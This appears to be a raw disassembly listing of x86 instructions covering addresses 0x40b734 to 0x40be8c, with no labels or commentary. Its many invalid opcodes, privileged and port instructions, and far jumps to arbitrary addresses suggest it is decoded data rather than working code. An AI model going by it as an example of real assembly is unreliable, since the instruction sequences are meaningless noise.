  40b734:	pop    esi
  40b735:	retf   
  40b736:	push   cs
  40b737:	mov    ah,BYTE PTR [ebp+0x2c]
  40b73a:	add    DWORD PTR [ebx-0x24],edx
  40b73d:	pop    ebp
  40b73e:	jl     0x40b75c
  40b740:	cmp    DWORD PTR [edi],ebx
  40b742:	pop    esp
  40b743:	idiv   dl
  40b745:	(bad)  
  40b746:	mov    esi,0x34bdae09
  40b74b:	mov    ds:0xe4626dec,al
  40b750:	sub    BYTE PTR [edi],dh
  40b752:	sbb    al,0xb6
  40b754:	test   BYTE PTR [ecx],ch
  40b756:	cmp    al,0xb5
  40b758:	in     al,dx
  40b759:	js     0x40b74e
  40b75b:	loope  0x40b6e8
  40b75d:	mov    eax,ds:0xf7a454e0
  40b762:	aaa    
  40b763:	retf   
  40b764:	xor    cl,dl
  40b766:	and    eax,0x166027e
  40b76b:	ss ret 
  40b76d:	pop    ss
  40b76e:	fs mov ah,ah
  40b771:	cmp    BYTE PTR [eax+0x58],cl
  40b774:	ret    0xdb54
  40b777:	icebp  
  40b778:	push   es
  40b779:	mov    al,ds:0xd158519e
  40b77e:	jne    0x40b76e
  40b780:	and    DWORD PTR [esi+eax*8+0x4a75dff8],ebx
  40b787:	inc    eax
  40b788:	pop    edx
  40b789:	lea    ecx,[ecx+0x36e0fc9]
  40b78f:	add    BYTE PTR [esi-0x49],0xa
  40b793:	test   BYTE PTR [edx-0x61],ch
  40b796:	and    cl,ah
  40b798:	push   esp
  40b799:	out    dx,eax
  40b79a:	mov    BYTE PTR [edx-0x65986989],0x4
  40b7a1:	mov    edi,DWORD PTR [edx]
  40b7a3:	inc    edi
  40b7a4:	inc    edi
  40b7a5:	stos   BYTE PTR es:[edi],al
  40b7a6:	clc    
  40b7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7a8:	pop    ds
  40b7a9:	or     cl,BYTE PTR [edi+ebx*4-0x170792c]
  40b7b0:	inc    ebx
  40b7b1:	ror    BYTE PTR [ecx+edi*2+0x7991d9d7],0x5a
  40b7b9:	mov    ss,WORD PTR [edi-0x6db2d201]
  40b7bf:	iret   
  40b7c0:	stos   DWORD PTR es:[edi],eax
  40b7c1:	leave  
  40b7c2:	es dec ebp
  40b7c4:	sbb    ah,0xa5
  40b7c7:	ja     0x40b828
  40b7c9:	or     ebp,DWORD PTR ds:0x4c460c4f
  40b7cf:	ret    0xb38
  40b7d2:	xchg   BYTE PTR [esi+0x58],ch
  40b7d5:	sti    
  40b7d6:	cli    
  40b7d7:	rcr    cl,0x94
  40b7da:	popa   
  40b7db:	(bad)  
  40b7dc:	icebp  
  40b7dd:	sti    
  40b7de:	int    0xed
  40b7e0:	sub    BYTE PTR [ebp-0x10],0x70
  40b7e4:	xchg   ch,al
  40b7e6:	and    dh,BYTE PTR [ecx+0x227f1d8c]
  40b7ec:	fwait
  40b7ed:	mov    cl,0xca
  40b7ef:	pop    ebp
  40b7f0:	mov    DWORD PTR [ecx-0x19d30a66],ebp
  40b7f6:	dec    edx
  40b7f7:	cmp    DWORD PTR [edx-0x6d],ebx
  40b7fa:	xchg   ebp,eax
  40b7fb:	xor    eax,0xcccd605f
  40b800:	xchg   ebx,eax
  40b801:	int3   
  40b802:	mov    esp,0x7464a2f9
  40b807:	repnz das 
  40b809:	(bad)  
  40b80a:	dec    edx
  40b80b:	int3   
  40b80c:	mov    ah,0xea
  40b80e:	call   0x697c:0x872d1e79
  40b815:	mov    gs:0xfc43baa7,al
  40b81b:	xor    BYTE PTR [edi+0x54],0xcb
  40b81f:	cmp    BYTE PTR [edi+0x3d],dh
  40b822:	mov    ds,WORD PTR [eax-0x3a]
  40b825:	loopne 0x40b84a
  40b827:	in     al,0x68
  40b829:	call   0x9b32:0x7cae7c55
  40b830:	jno    0x40b890
  40b832:	pushf  
  40b833:	pop    ecx
  40b834:	add    al,0xad
  40b836:	dec    ecx
  40b837:	stos   DWORD PTR es:[edi],eax
  40b838:	lods   al,BYTE PTR ds:[esi]
  40b839:	hlt    
  40b83a:	mov    esp,0x73487253
  40b83f:	adc    BYTE PTR [esi],dh
  40b841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b842:	add    eax,0x7cbc1a63
  40b847:	dec    ebx
  40b848:	pop    es
  40b849:	loope  0x40b809
  40b84b:	test   BYTE PTR ds:0xd501ca1b,dl
  40b851:	dec    esi
  40b852:	adc    eax,0xc79ae508
  40b857:	mov    esi,DWORD PTR [ecx]
  40b859:	mov    dl,0xe8
  40b85b:	sbb    BYTE PTR [ecx+0x494e5867],cl
  40b861:	mov    fs,WORD PTR [edi-0x80]
  40b864:	pop    eax
  40b865:	mov    edi,0xcce4aa9e
  40b86a:	(bad)  
  40b86b:	ds inc edi
  40b86d:	fistp  DWORD PTR [edi+0x4d2472e4]
  40b873:	xchg   ecx,eax
  40b874:	sub    BYTE PTR ds:0x3cc73a7f,dl
  40b87a:	fld    st(7)
  40b87c:	aaa    
  40b87d:	add    eax,DWORD PTR [ecx]
  40b87f:	repnz mov ds,WORD PTR [esi-0x3e51421f]
  40b886:	sub    ah,BYTE PTR [ecx+eiz*1]
  40b889:	adc    ecx,edx
  40b88b:	cs ja  0x40b875
  40b88e:	adc    esp,DWORD PTR [eax+edi*1]
  40b891:	mov    dh,0xcd
  40b893:	xchg   edx,eax
  40b894:	dec    esi
  40b895:	int    0x3b
  40b897:	cmp    edx,DWORD PTR [edi]
  40b899:	adc    BYTE PTR [esi+eiz*4-0x7e],dl
  40b89d:	out    0x73,al
  40b89f:	adc    BYTE PTR [ecx+eax*4+0x3b],al
  40b8a3:	mov    ah,0x34
  40b8a5:	pop    esp
  40b8a6:	in     eax,0x30
  40b8a8:	pushf  
  40b8a9:	push   cs
  40b8aa:	out    0xea,eax
  40b8ac:	int3   
  40b8ad:	pop    edx
  40b8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8af:	fdivr  QWORD PTR [eax]
  40b8b1:	mov    dh,0x91
  40b8b3:	mov    eax,0x6fea6bf2
  40b8b8:	adc    BYTE PTR [eax+0x1f],ch
  40b8bb:	iret   
  40b8bc:	fcomp  QWORD PTR [ecx+edx*4-0x1e]
  40b8c0:	js     0x40b89c
  40b8c2:	je     0x40b885
  40b8c4:	inc    esi
  40b8c5:	or     eax,0x80e32a30
  40b8ca:	repnz stos BYTE PTR es:[edi],al
  40b8cc:	sub    eax,0x6f838f12
  40b8d1:	repz jge 0x40b948
  40b8d4:	frstor [edi+0x5e902fe8]
  40b8da:	inc    edx
  40b8db:	jl     0x40b863
  40b8dd:	cs in  al,dx
  40b8df:	nop
  40b8e0:	in     al,dx
  40b8e1:	xchg   ecx,eax
  40b8e2:	gs jp  0x40b922
  40b8e5:	sub    al,0xa4
  40b8e7:	lds    eax,FWORD PTR [eax-0x3e]
  40b8ea:	pushf  
  40b8eb:	push   ebp
  40b8ec:	test   al,0xc0
  40b8ee:	inc    ebp
  40b8ef:	xchg   ecx,eax
  40b8f0:	js     0x40b924
  40b8f2:	push   edi
  40b8f3:	je     0x40b945
  40b8f5:	mov    ds:0x5a8a71b8,al
  40b8fa:	outs   dx,DWORD PTR ds:[esi]
  40b8fb:	cmp    esp,esi
  40b8fd:	xchg   ebp,eax
  40b8fe:	fnsave [esi+ecx*8]
  40b901:	(bad)  
  40b902:	sar    BYTE PTR [ebx],cl
  40b904:	push   ds
  40b905:	mov    ecx,0xb01bb35
  40b90a:	cli    
  40b90b:	jmp    0x40b95f
  40b90d:	jb     0x40b922
  40b90f:	xchg   ebp,eax
  40b910:	call   0xa4272fbd
  40b915:	jnp    0x40b8be
  40b917:	inc    ebx
  40b918:	loop   0x40b8f5
  40b91a:	iret   
  40b91b:	sbb    BYTE PTR [ecx+0x6a],bh
  40b91e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b920:	xchg   esi,eax
  40b921:	ss jo  0x40b98a
  40b924:	in     eax,0x5a
  40b926:	add    eax,0x3bc4eff5
  40b92b:	mov    ecx,0xfdbc3474
  40b930:	mov    edi,DWORD PTR [eax+0x52]
  40b933:	stc    
  40b934:	xchg   edx,eax
  40b935:	jno    0x40b987
  40b937:	fmul   DWORD PTR [edi-0x5c]
  40b93a:	inc    DWORD PTR [edi-0x6d5553d]
  40b940:	rol    BYTE PTR [ebx],cl
  40b942:	cmp    bl,BYTE PTR [ebx-0x4a8dbdbe]
  40b948:	fadd   st,st(0)
  40b94a:	push   0x5ef68764
  40b94f:	fimul  DWORD PTR [ebx+0x664c1649]
  40b955:	sbb    BYTE PTR [edx-0x2c],dh
  40b958:	fimul  WORD PTR [esi]
  40b95a:	mov    esi,gs
  40b95c:	jle    0x40b9b5
  40b95e:	xchg   dl,ch
  40b960:	pop    ebx
  40b961:	xchg   edx,eax
  40b962:	sub    eax,0x3bf1a34d
  40b967:	imul   esp,DWORD PTR [eax+eax*8+0x7021eaad],0xffffffd7
  40b96f:	es ins BYTE PTR es:[edi],dx
  40b971:	dec    edx
  40b972:	call   0xd1fda425
  40b977:	retf   
  40b978:	jns    0x40b9a8
  40b97a:	in     eax,0xd1
  40b97c:	arpl   WORD PTR [esi-0x67],di
  40b97f:	inc    edi
  40b980:	pushf  
  40b981:	xor    eax,0x56661aaa
  40b986:	jns    0x40b94c
  40b988:	adc    esi,ebp
  40b98a:	and    eax,0x71613048
  40b98f:	mov    edi,0xaee90e9d
  40b994:	dec    ebp
  40b995:	inc    esp
  40b996:	leave  
  40b997:	inc    esp
  40b998:	push   esp
  40b999:	or     BYTE PTR [edx-0x44d6981a],bl
  40b99f:	test   DWORD PTR [ecx-0x32],ecx
  40b9a2:	mov    ecx,0xaeb98868
  40b9a7:	in     al,0x95
  40b9a9:	jge    0x40ba27
  40b9ab:	push   esp
  40b9ac:	sbb    bh,BYTE PTR [ecx+0x7c]
  40b9af:	mov    eax,eax
  40b9b1:	xchg   edi,eax
  40b9b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b3:	adc    BYTE PTR [ecx+0x3a],al
  40b9b6:	mov    WORD PTR ds:0x6f081bf1,?
  40b9bc:	fsub   DWORD PTR [ebx+0x77]
  40b9bf:	or     DWORD PTR [eax+0x79],ebp
  40b9c2:	clc    
  40b9c3:	cli    
  40b9c4:	data16 xor al,0xbc
  40b9c7:	dec    ebx
  40b9c8:	in     eax,dx
  40b9c9:	icebp  
  40b9ca:	loope  0x40b9c1
  40b9cc:	dec    ebp
  40b9cd:	in     al,0x20
  40b9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d0:	test   al,0xe9
  40b9d2:	out    dx,al
  40b9d3:	fild   DWORD PTR [ebx+0x5e]
  40b9d6:	sub    BYTE PTR [ecx-0x1e],dh
  40b9d9:	clc    
  40b9da:	lock aas 
  40b9dc:	mov    bl,0x36
  40b9de:	push   es
  40b9df:	jne    0x40b9e2
  40b9e1:	or     edi,DWORD PTR ds:0xe90052b1
  40b9e7:	push   ecx
  40b9e8:	es ffree st(5)
  40b9eb:	das    
  40b9ec:	repz jge 0x40ba39
  40b9ef:	hlt    
  40b9f0:	inc    ebp
  40b9f1:	and    DWORD PTR [ecx+0x48],0xffffffcc
  40b9f5:	dec    esp
  40b9f6:	jb     0x40b995
  40b9f8:	pop    ebp
  40b9f9:	dec    ecx
  40b9fa:	outs   dx,BYTE PTR ds:[esi]
  40b9fb:	int3   
  40b9fc:	fsub   DWORD PTR [edi]
  40b9fe:	dec    ebp
  40b9ff:	jl     0x40b9f1
  40ba01:	xchg   esp,eax
  40ba02:	mov    ds:0xaab2f625,al
  40ba07:	mov    BYTE PTR [edi+ebx*2],0x19
  40ba0b:	daa    
  40ba0c:	sub    ebp,DWORD PTR [esi-0x4c]
  40ba0f:	lds    esi,FWORD PTR [esi]
  40ba11:	add    eax,0xf3a3aa81
  40ba16:	mov    ah,0x1e
  40ba18:	jmp    0x40ba68
  40ba1a:	mov    ah,0x6f
  40ba1c:	sbb    bl,BYTE PTR [ebx+edx*1+0x632b647a]
  40ba23:	push   0xffffffbf
  40ba25:	add    al,0xba
  40ba27:	sbb    eax,0x488f29db
  40ba2c:	push   edi
  40ba2d:	inc    eax
  40ba2e:	ins    DWORD PTR es:[edi],dx
  40ba2f:	sbb    dl,BYTE PTR [eax+0x41]
  40ba32:	repz in eax,0xb6
  40ba35:	pop    edi
  40ba36:	mov    ebp,edx
  40ba38:	lahf   
  40ba39:	cs xchg esi,eax
  40ba3b:	int    0xa1
  40ba3d:	mov    DWORD PTR [esi+0x2f14989c],eax
  40ba43:	out    dx,al
  40ba44:	adc    ch,BYTE PTR [ecx-0x2d]
  40ba47:	hlt    
  40ba48:	sub    DWORD PTR [edi+0x14ed9c7e],0xffffffe6
  40ba4f:	ds push ds
  40ba51:	xor    al,0x3b
  40ba53:	ret    
  40ba54:	cs js  0x40bac4
  40ba57:	retf   0x948e
  40ba5a:	pop    ebx
  40ba5b:	mov    ch,0x1c
  40ba5d:	outs   dx,BYTE PTR ds:[esi]
  40ba5e:	cmp    bh,BYTE PTR [edx+0x65825a64]
  40ba64:	and    al,0x9f
  40ba66:	dec    edx
  40ba67:	dec    ecx
  40ba68:	aas    
  40ba69:	lds    ebx,FWORD PTR [edi-0x72]
  40ba6c:	pop    ecx
  40ba6d:	push   edi
  40ba6e:	(bad)  
  40ba6f:	cli    
  40ba70:	sub    dl,BYTE PTR [edx]
  40ba72:	add    eax,0x20c67eca
  40ba77:	mov    esp,0xa58c3947
  40ba7c:	ins    DWORD PTR es:[edi],dx
  40ba7d:	jmp    0x85932ad7
  40ba82:	mov    eax,0x862f6515
  40ba87:	or     BYTE PTR [eax],dh
  40ba89:	push   esp
  40ba8a:	add    al,0x6d
  40ba8c:	jb     0x40ba29
  40ba8e:	sahf   
  40ba8f:	sub    al,0x38
  40ba91:	jb     0x40ba1d
  40ba93:	stc    
  40ba94:	iret   
  40ba95:	push   0xffffff9d
  40ba97:	pop    esp
  40ba98:	(bad)
  40ba9b:	int    0x10
  40ba9d:	sti    
  40ba9e:	adc    eax,0xef74a2cf
  40baa3:	sbb    BYTE PTR [esp+ecx*1+0xd75b421],dl
  40baaa:	fwait
  40baab:	je     0x40ba30
  40baad:	mov    al,0xb3
  40baaf:	stos   BYTE PTR es:[edi],al
  40bab0:	jg     0x40bb1b
  40bab2:	mov    ch,0xb6
  40bab4:	add    BYTE PTR [edx-0x2b],ch
  40bab7:	push   cs
  40bab8:	ins    DWORD PTR es:[edi],dx
  40bab9:	(bad)  
  40babb:	inc    ebx
  40babc:	or     ebx,DWORD PTR [eax-0x4e]
  40babf:	div    DWORD PTR [ebx-0x44cbb55f]
  40bac5:	xchg   ecx,eax
  40bac6:	jg     0x40bb41
  40bac8:	add    DWORD PTR [ebx+0x16e681e9],0x523d6c35
  40bad2:	jmp    0xc27b:0x122ecdf5
  40bad9:	dec    ebp
  40bada:	mov    ch,BYTE PTR [esi-0x381c2cb3]
  40bae0:	sbb    al,0x76
  40bae2:	ins    BYTE PTR es:[edi],dx
  40bae3:	sub    eax,0xfd963985
  40bae8:	pop    ds
  40bae9:	or     al,0x4d
  40baeb:	add    DWORD PTR [edi+eax*8-0x5c8b4433],eax
  40baf2:	out    dx,al
  40baf3:	dec    esi
  40baf4:	fcom   DWORD PTR [ebp-0x80]
  40baf7:	mov    DWORD PTR [bp+si+0x2cb2],ebp
  40bafc:	xchg   ebp,eax
  40bafd:	push   esi
  40bafe:	sub    DWORD PTR [ebx+eiz*4+0x5c],esp
  40bb02:	cmp    eax,0xdc1b841b
  40bb07:	sbb    BYTE PTR [edx+0x12],ah
  40bb0a:	clc    
  40bb0b:	shl    BYTE PTR [ebp+eiz*8+0x1],0x68
  40bb10:	dec    eax
  40bb11:	mov    ebx,0x315af4cf
  40bb16:	adc    al,0xb0
  40bb18:	sbb    al,0xa1
  40bb1a:	or     eax,0x6f39d934
  40bb1f:	inc    edx
  40bb20:	fadd   DWORD PTR [ebx-0x31]
  40bb23:	mov    edi,0xf33a635f
  40bb28:	jmp    0x40babb
  40bb2a:	lahf   
  40bb2b:	mov    al,ds:0xf6e3ffb8
  40bb30:	dec    esi
  40bb31:	(bad)  
  40bb32:	xor    cl,BYTE PTR [ecx+edi*2]
  40bb35:	ret    0xcade
  40bb38:	add    DWORD PTR [ecx],edx
  40bb3a:	mov    ecx,0x4e3564be
  40bb3f:	sbb    BYTE PTR [edx+ecx*1-0x4f6064de],ch
  40bb46:	xchg   edi,eax
  40bb47:	pop    ss
  40bb48:	ss inc edi
  40bb4a:	adc    ch,BYTE PTR [edi+edi*1]
  40bb4d:	add    dl,BYTE PTR cs:[ecx+eax*1+0x2985011d]
  40bb55:	inc    ecx
  40bb56:	dec    esi
  40bb57:	ds inc ebp
  40bb59:	xor    DWORD PTR [ebx+0x5c],0x30
  40bb5d:	data16 sub BYTE PTR ds:[ecx+edx*2],0xf6
  40bb63:	jmp    0x943c6474
  40bb68:	and    ecx,DWORD PTR [ecx]
  40bb6a:	lahf   
  40bb6b:	push   ds
  40bb6c:	iret   
  40bb6d:	jo     0x40bb94
  40bb6f:	leave  
  40bb70:	and    ecx,esp
  40bb72:	sbb    eax,0x86b1ea5
  40bb77:	add    ebp,DWORD PTR [esi+0x31]
  40bb7a:	xchg   ebp,eax
  40bb7b:	xor    al,0x23
  40bb7d:	dec    esi
  40bb7e:	retf   0xe863
  40bb81:	rol    DWORD PTR [esi-0x3934f160],cl
  40bb87:	js     0x40bbb5
  40bb89:	test   eax,0x3445970b
  40bb8e:	cs mov ah,0x7e
  40bb91:	retf   0x7c42
  40bb94:	or     al,0xf2
  40bb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb97:	or     eax,0x46c25c75
  40bb9c:	add    DWORD PTR [edi+0x5b],esp
  40bb9f:	push   esi
  40bba0:	sti    
  40bba1:	jb     0x40bbd0
  40bba3:	xor    edi,DWORD PTR [ebx+0x173d9dbc]
  40bba9:	pop    ebx
  40bbaa:	int3   
  40bbab:	pop    ds
  40bbac:	or     BYTE PTR [ebx-0x7f533f62],bl
  40bbb2:	ror    DWORD PTR [edx-0x903ab71],cl
  40bbb8:	popa   
  40bbb9:	in     eax,0x28
  40bbbb:	ror    ecx,1
  40bbbd:	and    al,BYTE PTR [eax+0x2d]
  40bbc0:	hlt    
  40bbc1:	pusha  
  40bbc2:	sbb    bl,0x7a
  40bbc5:	pop    eax
  40bbc6:	mov    al,0xf3
  40bbc8:	lahf   
  40bbc9:	mov    bl,0x21
  40bbcb:	shl    DWORD PTR [edx],1
  40bbcd:	loopne 0x40bba5
  40bbcf:	in     eax,0x93
  40bbd1:	dec    edi
  40bbd2:	pop    esi
  40bbd3:	stos   DWORD PTR es:[edi],eax
  40bbd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbd5:	inc    edx
  40bbd6:	pop    ebx
  40bbd7:	adc    al,0xc2
  40bbd9:	lods   al,BYTE PTR ds:[esi]
  40bbda:	(bad)  
  40bbdb:	mov    BYTE PTR es:[edx],dh
  40bbde:	popa   
  40bbdf:	push   ebp
  40bbe0:	(bad)  
  40bbe1:	cmc    
  40bbe2:	jl     0x40bb95
  40bbe4:	adc    DWORD PTR [ebp+ecx*4+0x8],0x69
  40bbe9:	push   esp
  40bbea:	arpl   WORD PTR ds:0x5ee07306,si
  40bbf0:	push   esp
  40bbf1:	(bad)  
  40bbf2:	cmp    al,0x3c
  40bbf4:	retf   
  40bbf5:	sar    DWORD PTR [esi+0x7f3b1560],0xe6
  40bbfc:	inc    edi
  40bbfd:	(bad)  
  40bbfe:	push   cs
  40bbff:	add    al,0x62
  40bc01:	out    dx,eax
  40bc02:	js     0x40bc7a
  40bc04:	or     DWORD PTR [edi-0x7841ad],ebp
  40bc0a:	enter  0x8b65,0x53
  40bc0e:	imul   edi,DWORD PTR [esi+0x5a],0xc1c9d7d5
  40bc15:	or     BYTE PTR [edx],ah
  40bc17:	mov    esi,0x7073494a
  40bc1c:	cld    
  40bc1d:	arpl   WORD PTR ds:0x42310704,di
  40bc23:	rep ins BYTE PTR es:[edi],dx
  40bc25:	arpl   WORD PTR [ebx],di
  40bc27:	aad    0x9d
  40bc29:	ins    BYTE PTR es:[edi],dx
  40bc2a:	aad    0x67
  40bc2c:	sbb    BYTE PTR [ecx+0x41],cl
  40bc2f:	xor    eax,0x99fdac08
  40bc34:	in     al,0xfe
  40bc36:	shr    esi,1
  40bc38:	stos   DWORD PTR es:[edi],eax
  40bc39:	add    ah,dl
  40bc3b:	add    BYTE PTR [edi-0x73],dl
  40bc3e:	loopne 0x40bc5f
  40bc40:	xlat   BYTE PTR ds:[ebx]
  40bc41:	mov    al,ds:0x33491d55
  40bc46:	dec    DWORD PTR [ebx]
  40bc48:	repz sub BYTE PTR [esi],bh
  40bc4b:	jl     0x40bc5f
  40bc4d:	ja     0x40bc95
  40bc4f:	nop
  40bc50:	mov    bl,0x70
  40bc52:	ret    0x90c5
  40bc55:	in     al,0x5f
  40bc57:	inc    edi
  40bc58:	int3   
  40bc59:	jo     0x40bbf2
  40bc5b:	arpl   WORD PTR [edx+0x73fe63cf],si
  40bc61:	je     0x40bc55
  40bc63:	inc    ebp
  40bc64:	mov    eax,ds:0xb6cd0213
  40bc69:	aas    
  40bc6a:	pop    ds
  40bc6b:	xor    eax,0x40f86ed8
  40bc70:	cmp    eax,0xe9add609
  40bc75:	enter  0x2a66,0xd
  40bc79:	lahf   
  40bc7a:	gs pop esi
  40bc7c:	jnp    0x40bc5e
  40bc7e:	hlt    
  40bc7f:	and    esp,DWORD PTR [ecx-0x3217b660]
  40bc85:	adc    DWORD PTR [ebp+ecx*2-0x77],esp
  40bc89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc8a:	ja     0x40bcc8
  40bc8c:	and    BYTE PTR [edx+edi*1],0x99
  40bc90:	rcl    DWORD PTR gs:[edx-0x1e72810a],cl
  40bc97:	(bad)  
  40bc98:	dec    esi
  40bc99:	xor    ch,BYTE PTR [eax-0x2197531e]
  40bc9f:	(bad)  
  40bca0:	lock cmp ecx,DWORD PTR [ebp+0xce3d48f]
  40bca7:	jge    0x40bc64
  40bca9:	(bad)  
  40bcaa:	jmp    0xe5dc968a
  40bcaf:	hlt    
  40bcb0:	out    dx,eax
  40bcb1:	sbb    al,0x8a
  40bcb3:	mov    ds:0x718a2057,al
  40bcb8:	mov    ds:0x1b34fdad,al
  40bcbd:	mov    BYTE PTR [edx-0x61],bh
  40bcc0:	pop    es
  40bcc1:	outs   dx,DWORD PTR ds:[esi]
  40bcc2:	inc    edi
  40bcc3:	cmp    ebp,DWORD PTR [eax-0x36]
  40bcc6:	sti    
  40bcc7:	in     al,0x79
  40bcc9:	jmp    0x40bca0
  40bccb:	push   ecx
  40bccc:	jmp    0x40bd32
  40bcce:	push   ebx
  40bccf:	inc    ebp
  40bcd0:	(bad)  
  40bcd1:	mov    cl,0xaf
  40bcd3:	data16 daa 
  40bcd5:	sar    DWORD PTR [ecx+edx*8],1
  40bcd8:	and    esp,esp
  40bcda:	(bad)  
  40bcdb:	outs   dx,DWORD PTR ds:[esi]
  40bcdc:	lahf   
  40bcdd:	out    0x9e,al
  40bcdf:	or     DWORD PTR [ecx],0x2a9c8fbb
  40bce5:	loopne 0x40bd10
  40bce7:	sahf   
  40bce8:	push   cs
  40bce9:	mov    bl,BYTE PTR [esi*4-0x5af9e422]
  40bcf0:	cld    
  40bcf1:	sbb    eax,0x6826f4e0
  40bcf6:	ret    0x2c4a
  40bcf9:	pop    edi
  40bcfa:	aad    0x7e
  40bcfc:	pop    esp
  40bcfd:	inc    esi
  40bcfe:	(bad)  
  40bd00:	sub    esi,DWORD PTR [esi-0xb07baf2]
  40bd06:	push   0x816a3ca8
  40bd0b:	xchg   ecx,eax
  40bd0c:	pop    eax
  40bd0d:	jno    0x40bd62
  40bd0f:	or     DWORD PTR [esi-0x29],0x8bb99b24
  40bd16:	mov    bl,0x1d
  40bd18:	sahf   
  40bd19:	ds jle 0x40bd79
  40bd1c:	jmp    0x40bd17
  40bd1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd1f:	jbe    0x40bcdd
  40bd21:	jne    0x40bd46
  40bd23:	and    ebx,DWORD PTR [ebx-0x1e]
  40bd26:	repnz mov ecx,0xf338e578
  40bd2c:	lds    eax,FWORD PTR [edi]
  40bd2e:	add    esp,DWORD PTR [ebp+0x20]
  40bd31:	push   eax
  40bd32:	jo     0x40bced
  40bd34:	jno    0x40bd9c
  40bd36:	mov    esp,DWORD PTR [ebx]
  40bd38:	mov    ch,BYTE PTR [ecx+0x51948101]
  40bd3e:	jge    0x40bd4d
  40bd40:	ins    BYTE PTR es:[edi],dx
  40bd41:	inc    ecx
  40bd42:	pop    ss
  40bd43:	pop    ecx
  40bd44:	or     BYTE PTR [eax-0x6f911c8e],dh
  40bd4a:	cli    
  40bd4b:	dec    esi
  40bd4c:	shl    DWORD PTR [esp+edi*1],1
  40bd4f:	sbb    BYTE PTR [ecx],0xf5
  40bd52:	call   0xe20e:0x2158aa36
  40bd59:	xor    dl,al
  40bd5b:	dec    esi
  40bd5c:	imul   edx,DWORD PTR [ecx],0x7c9d852a
  40bd62:	in     eax,dx
  40bd63:	inc    eax
  40bd64:	fdiv   DWORD PTR [ebx-0x4a]
  40bd67:	fiadd  WORD PTR [edx+0x4c1a5d8]
  40bd6d:	inc    ecx
  40bd6e:	lods   al,BYTE PTR ds:[esi]
  40bd6f:	out    dx,al
  40bd70:	mov    edx,0xaec1d07b
  40bd75:	mov    edx,0xd42ad002
  40bd7a:	sbb    eax,0xb25ee528
  40bd7f:	ss dec esi
  40bd81:	not    BYTE PTR [ebp-0x3325c266]
  40bd87:	frstor [eax]
  40bd89:	or     al,0xe8
  40bd8b:	mul    ah
  40bd8d:	push   ds
  40bd8e:	cdq    
  40bd8f:	sbb    ah,BYTE PTR [edi+esi*1+0x79c5d1e]
  40bd96:	push   es
  40bd97:	call   0x1b23024e
  40bd9c:	cld    
  40bd9d:	xor    ah,dl
  40bd9f:	pop    ds
  40bda0:	sub    bh,BYTE PTR [ebx+0x249109a]
  40bda6:	daa    
  40bda7:	sub    eax,0xa6540133
  40bdac:	call   0x7e61462e
  40bdb1:	mov    ch,0x20
  40bdb3:	cmp    BYTE PTR [esi+0x910c87],ah
  40bdb9:	dec    eax
  40bdba:	adc    al,0xf4
  40bdbc:	xchg   DWORD PTR [ebp+0x1e],eax
  40bdbf:	mov    eax,ds:0xf87a47cb
  40bdc4:	push   eax
  40bdc5:	daa    
  40bdc6:	jp     0x40bde6
  40bdc8:	push   ds
  40bdc9:	inc    esi
  40bdca:	adc    esi,DWORD PTR [ecx+0x5243d7c7]
  40bdd0:	jne    0x40bdcb
  40bdd2:	sub    DWORD PTR [ecx],ebp
  40bdd4:	mov    ds:0x31a11333,al
  40bdd9:	mov    bl,0x87
  40bddb:	add    al,BYTE PTR [ebx+0xdc1b8f0]
  40bde1:	fistp  WORD PTR [esi+ebx*8+0x36]
  40bde5:	mov    edx,0xade1a133
  40bdea:	popa   
  40bdeb:	push   esi
  40bdec:	jmp    0xfe38f9ea
  40bdf1:	sahf   
  40bdf2:	jb     0x40bdf6
  40bdf4:	arpl   di,ax
  40bdf6:	pop    eax
  40bdf7:	pop    esi
  40bdf8:	cmp    al,0x63
  40bdfa:	lahf   
  40bdfb:	in     al,0xfa
  40bdfd:	pop    ds
  40bdfe:	test   bl,0x3
  40be01:	cmp    BYTE PTR [eax-0xa2bc638],dl
  40be07:	pop    esp
  40be08:	test   BYTE PTR [edi-0x55],ch
  40be0b:	in     al,dx
  40be0c:	ret    
  40be0d:	cwde   
  40be0e:	fidivr DWORD PTR [ebp+0x714a1c28]
  40be14:	mov    al,0x8e
  40be16:	repz dec ah
  40be19:	pushf  
  40be1a:	aad    0x99
  40be1c:	mov    BYTE PTR [esi+0x34686f99],dl
  40be22:	mov    dh,cl
  40be24:	xchg   edi,eax
  40be25:	aad    0xbd
  40be27:	test   ebx,ebx
  40be29:	dec    eax
  40be2a:	inc    ebp
  40be2c:	jge    0x40be55
  40be2e:	lds    esp,FWORD PTR [eax]
  40be30:	sbb    eax,0xcc3c9a2a
  40be35:	loop   0x40be64
  40be37:	adc    al,0x62
  40be39:	dec    eax
  40be3a:	push   ebp
  40be3b:	or     al,0x6d
  40be3d:	mov    al,ds:0x682c7055
  40be42:	fwait
  40be43:	leave  
  40be44:	add    al,0x23
  40be46:	mov    bp,0x340
  40be4a:	test   al,0x17
  40be4c:	pop    eax
  40be4d:	test   al,0x78
  40be4f:	sub    edx,esi
  40be51:	in     eax,0x50
  40be53:	and    BYTE PTR [ebx+0x5f37f05b],0x5d
  40be5a:	icebp  
  40be5b:	pop    ss
  40be5c:	rcl    BYTE PTR [ecx+eiz*2],1
  40be5f:	rcr    esp,0x9a
  40be62:	lahf   
  40be63:	out    dx,eax
  40be64:	inc    ebx
  40be65:	adc    al,0x34
  40be67:	pop    esi
  40be68:	xor    BYTE PTR [esi+esi*2+0x3e5ece35],0x2a
  40be70:	inc    ecx
  40be71:	jge    0x40bebb
  40be73:	push   edi
  40be74:	mov    esp,0xbe507ac6
  40be79:	sbb    al,0xe
  40be7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be7c:	add    edx,DWORD PTR [esi]
  40be7e:	pusha  
  40be7f:	out    dx,al
  40be80:	inc    edx
  40be81:	push   cs
  40be82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be83:	outs   dx,DWORD PTR ds:[esi]
  40be84:	ja     0x40be99
  40be86:	or     bh,ah
  40be88:	mov    bh,0x6c
  40be8a:	push   0xffffffe8
  40be8c:	dec    esi
